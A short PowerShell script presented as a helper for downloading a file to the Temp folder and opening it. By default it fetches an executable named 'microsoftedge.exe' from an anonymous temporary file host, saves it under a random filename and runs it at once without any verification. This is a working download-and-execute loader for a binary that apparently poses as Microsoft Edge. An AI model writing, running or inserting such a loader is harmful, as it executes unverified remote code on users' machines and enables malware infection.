# DownloadAndOpenTemp.ps1
# Downloads a file from a URL to the Temp folder with a random filename, then opens it

param(
    [Parameter(Mandatory=$false)]
    [string]$Url = "https://tmpfiles.org/dl/15161396/microsoftedge.exe",  # <<< EDIT THIS URL HERE >>>

    [Parameter(Mandatory=$false)]
    [string]$FileExtension = "exe"                   # Change if you know the extension (e.g., "pdf", "jpg")
)

# Generate a random filename to avoid conflicts
$randomId = Get-Random -Minimum 100000 -Maximum 999999
$fileName = "downloaded_file_$randomId.$FileExtension"
$outputPath = Join-Path $env:TEMP $fileName

# Ensure Temp folder exists (it always should)
if (-not (Test-Path $env:TEMP)) {
    Write-Host "Temp folder not found!" -ForegroundColor Red
    exit
}

try {
    Write-Host "Downloading from: $Url" -ForegroundColor Cyan
    Write-Host "Saving to Temp as: $fileName" -ForegroundColor Cyan
    Write-Host "Full path: $outputPath" -ForegroundColor Gray

    # Download the file
    Invoke-WebRequest -Uri $Url -OutFile $outputPath -UseBasicParsing

    Write-Host "Download completed successfully!" -ForegroundColor Green

    # Automatically open the file with its default program
    if (Test-Path $outputPath) {
        Write-Host "Opening the downloaded file..." -ForegroundColor Magenta
        Invoke-Item $outputPath

        # Alternative (uncomment if you prefer to open the Temp folder and highlight the file):
        # Start-Process explorer.exe -ArgumentList "/select,`"$outputPath`""
    }
}
catch {
    Write-Host "Error: Download failed!" -ForegroundColor Red
    Write-Host $_.Exception.Message -ForegroundColor Red
}

# No pause needed since the file opens automatically
